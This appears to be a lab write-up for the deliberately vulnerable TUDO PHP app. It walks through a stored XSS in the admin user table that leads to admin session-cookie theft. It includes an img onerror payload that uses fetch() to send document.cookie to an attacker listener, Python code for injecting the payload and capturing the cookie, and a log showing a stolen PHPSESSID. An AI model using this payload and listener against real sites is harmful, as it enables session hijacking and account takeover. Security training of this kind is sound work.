# Privilege Escalation

## Overview

Privilege escalation vulnerabilities allow attackers to gain elevated access within an application beyond what is intended for their account. In the case of TUDO, we identified a XSS vulnerability that allows a regular authenticated user to steal the administrator's session cookie. Because a cronjob simulates the admin logging in and visiting the homepage every minute, this can be exploited reliably without any direct interaction from the admin.

## Static Analysis

Static analysis was performed using **ProgPilot**, among the found vulnerabilities most relevant was:

```json
{
  "source_name": ["$row[3]"],
  "source_line": [30],
  "source_column": [1097],
  "source_file": ["\/workspace\/index.php"],
  "sink_name": "echo",
  "sink_line": 30,
  "sink_column": 1090,
  "sink_file": "\/workspace\/index.php",
  "vuln_name": "xss",
  "vuln_cwe": "CWE_79",
  "vuln_id": "070c93e86e07ebf463b8cd7dd28a75d968acce46443bb492f214c5a5def6c428",
  "vuln_type": "taint-style"
}
```

Vulnerability pointed to this part of `index.php`:
```php
<?php if (isset($_SESSION['isadmin'])) {
    include('includes/db_connect.php');
    $ret = pg_query($db, "select * from users order by uid asc;");

    echo '<h4>[Admin Section]</h4>';
    echo '<table>';
    echo '<tr><th>Uid</th><th>Username</th><th>Password (SHA256)</th><th>Description</th></tr>';
    while ($row = pg_fetch_row($ret)) {
        echo '<tr>';
        echo '<td>'.$row[0].'</td>';
        echo '<td>'.$row[1].'</td>';
        echo '<td>'.$row[2].'</td>';
        echo '<td>'.$row[3].'</td>';  //  <-----  this line specifically
        echo '</tr>';
    }
    echo '</table><br>';
    echo '<b>Import user:</b> <br>';
?>
```

### Key Findings

* **Vulnerability:** The admin dashboard in **index.php** renders all user records from the database in a table, including the description field, without any sanitization. A regular user can control the content of their own description, making this a XSS vulnerability.

* **Admin Session Cookie:** The admin's session is managed via `PHPSESSID` cookie with no `HttpOnly` flag, making it accessible from JavaScript via `document.cookie`.

* **Cronjob:** A cronjob simulates the admin logging in and visiting the homepage every minute, meaning the payload will be triggered without needing to wait for a real user action. 

* **IMPORTANT**: On Windows machines `\r` character at the end of `emulate.cron` file may prevent cronjob from working and needs to be removed.

## Exploitation

The attack follows a two-stage chain to steal the admin session cookie.

### Step 0: Logging in as a regular user

The attacker must be already authenticated as a regular user. This can be achieved either by reusing the same `session` as in the [**login bypass attack**](../login_bypass/INSTRUCTIONS.md) or by changing the default `username` and `password` if it's run as a standalone script.

### Step 1: Injecting the XSS Payload

We update our user description to a JavaScript payload that sends `document.cookie` to an attacker-controlled listener. The payload uses an `<img>` tag with an `onerror` handler.

```python
def _set_description(self, payload):
    data = {"description": payload}
    resp = self.session.post(f"{self.base_url}/profile.php", data=data)
    return resp.status_code == 200
```

The payload passed to this method:

```python
payload = f'<img src=x onerror="fetch(\'http://{self.lhost}:{self.lport}/?secret=\'+document.cookie)"/>'
```

When the admin visits **index.php**, the description is rendered raw in their browser, the `onerror` handler fires, and their `PHPSESSID` is sent to our listener as a query parameter.

### Step 2: Listening for the Cookie

We start a local HTTP server that blocks until it receives one request, extracts the cookie from the `secret` query parameter, and returns it.

```python
def _listen_for_cookie(self):
    escalation = self

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            params = parse_qs(urlparse(self.path).query)
            if "secret" in params:
                escalation.admin_cookie = params["secret"][0]
            self.send_response(200)
            self.end_headers()

        def log_message(self, format, *args):
            pass

    server = HTTPServer(("0.0.0.0", self.lport), Handler)
    server.handle_request()
```

Once the cronjob fires and the admin's browser loads the page, the cookie is captured and the listener exits.

```console
$ python privilege_escalation/privilege_escalation.py

Privilege Escalation Started
[*] Set description to XSS payload
[*] Listening on host.docker.internal:8001...
[*] Waiting for admin to visit homepage...
[*] Got admin cookie: PHPSESSID=de00e9d356a42f962b7ac4031e4aa244
```

---

## Automated Exploit Script

The full privilege escalation script can be found in [**privilege_escalation.py**](./privilege_escalation.py). It automates the process of injecting the XSS payload and capturing the admin session cookie.

---
